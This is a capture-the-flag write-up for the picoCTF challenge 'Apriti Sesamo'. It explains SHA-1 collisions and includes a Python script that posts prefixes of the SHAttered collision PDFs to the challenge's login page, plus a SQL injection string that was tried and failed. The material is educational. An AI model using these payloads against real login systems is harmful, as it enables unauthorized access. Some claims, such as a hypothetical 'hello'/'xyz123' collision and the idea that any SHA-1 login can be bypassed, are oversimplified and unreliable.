# **🔥 Write-Up for "Apriti Sesamo" - SHA-1 Collision Attack 🔥**

This write-up will cover everything in detail, including the **underlying vulnerability (SHA-1 Collision), how we analyzed the challenge, the thought process that led to discovering the exploit, and how we executed the attack successfully.**

---

# **📌 Part 1: Understanding the SHA-1 Collision Vulnerability**

## **1️⃣ What is a Hash Function?**

A **hash function** is a mathematical function that takes any input (password, text, file) and produces a **fixed-length output** (called a **hash**).

The main purpose of hashing is **to store sensitive data (like passwords) securely**.

✅ **Example of using SHA-1 to hash a password in Python:**

```python
import hashlib
print(hashlib.sha1(b"password").hexdigest())

```

🔹 **Output:**

```
5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8

```

📌 **The same input always produces the same output, but it is impossible to reverse the process to retrieve the original input.**

---

## **2️⃣ How is Hashing Used in Authentication?**

📌 **In authentication systems, password verification works as follows:**

1. When a user **creates an account**, the system **stores only the hashed password (`hash`)**, not the actual password.
2. When the user **logs in**, the system **hashes the entered password** and compares it to the stored hash.
3. If **`SHA-1(input password) == SHA-1(stored password)`**, access is granted.

✅ **Example of login authentication using SHA-1 in PHP:**

```php
$hashed_password = sha1("password");
if (sha1($_POST['pwd']) === $hashed_password) {
    echo "Login Successful";
}

```

🚨 **Issue: `SHA-1` is no longer secure, and it can be bypassed using a "Collision Attack"!**

---

## **3️⃣ What is the SHA-1 Collision Attack?**

🔹 **A collision occurs when two different inputs produce the same SHA-1 hash.**

🔹 This means that if we find two different values that have the same hash, we can **bypass authentication by using an incorrect but equivalent value.**

✅ **Hypothetical example of a SHA-1 collision:**

```
sha1("hello") == sha1("xyz123")

```

📌 **If we find two different inputs that have the same hash, we can exploit this to break into systems that rely on SHA-1 for authentication.**

🚨 **And this is exactly what we exploited in the "Apriti Sesamo" challenge!**

---

## **4️⃣ How Was the SHA-1 Collision Proven in Real Life?**

In **2017**, security researchers **demonstrated the first practical SHA-1 collision** using **two completely different PDF files that have the same SHA-1 hash**.

✔️ **These files are available at [shattered.io](https://shattered.io/).**

✔️ **If we compute the SHA-1 hash for both files, we get the exact same output!**

✔️ **We can use these files to exploit any system that relies on SHA-1 for authentication!**

✅ **Proof of Collision in Python:**

```python
import hashlib

file1 = open("shattered-1.pdf", "rb").read()
file2 = open("shattered-2.pdf", "rb").read()

print(hashlib.sha1(file1).hexdigest())
print(hashlib.sha1(file2).hexdigest())

```

🔹 **Output:**

```
38762cf7f55934b34d179ae6a4c80cadccbb7f0a
38762cf7f55934b34d179ae6a4c80cadccbb7f0a

```

🚀 **Even though the files are completely different, SHA-1 incorrectly thinks they are the same!**

---

# **📌 Part 2: How Did We Identify That the Website Uses SHA-1?**

## **Apriti sesamo**

## Description

I found a web app that claims to be impossible to hack!Try it [here](http://verbal-sleep.picoctf.net:50313/)!

**Hints 
-**Backup files

-Rumor has it, the lead developer is a militant emacs user

http://verbal-sleep.picoctf.net:50313/

## **🔎 How Did We Discover That SHA-1 Was Used for Authentication?**

### **1️⃣ SQL Injection and LFI Did Not Work**

- When we tried **SQL Injection**, such as:

we did **not** get any **SQL error or unexpected login success**, meaning that **SQL was not used for authentication**.
    
    ```sql
    admin' OR '1'='1' --
    
    ```
    

🚨 **This led us to suspect that authentication was handled differently, possibly using hashing.**

---

### **2️⃣ No "Incorrect Password" Message**

- Normally, when you enter **an incorrect password**, you get a message like:
    
    ```
    Incorrect Username or Password
    
    ```
    
- But here, we got a **generic response like:**
    
    ```
    Failed! No flag for you
    
    ```
    

🚨 **This indicated that the system was not comparing plaintext values but something else—possibly hashes.**

---

### **3️⃣ We Tried Entering SHA-1 Colliding Files**

✔️ **We sent the first 500 bytes of `shattered-1.pdf` and `shattered-2.pdf` as the username and password.**

✔️ **Because these two files have the same SHA-1 hash, the system incorrectly thought we entered the correct credentials!**

🚀 **This confirmed that SHA-1 was being used for authentication and that it was vulnerable to a collision attack!** 🔥

---

# **📌 Part 3: Executing the Attack and Extracting the Flag**

### **✅ Final Exploit Code**

```python
import requests
import urllib.request

# Fetch the first 500 bytes from SHA-1 colliding files
rotimi = urllib.request.urlopen("http://shattered.io/static/shattered-1.pdf").read()[:500]
letmein = urllib.request.urlopen("http://shattered.io/static/shattered-2.pdf").read()[:500]

# Send a login request with the colliding inputs
r = requests.post('http://verbal-sleep.picoctf.net:50313/impossibleLogin.php',
                  data={'username': rotimi, 'pwd': letmein}, allow_redirects=False)

# Print the response (which contains the flag)
print(r.text)

```

✅ **When we executed the script, we successfully bypassed the authentication and retrieved the flag!** 🎉
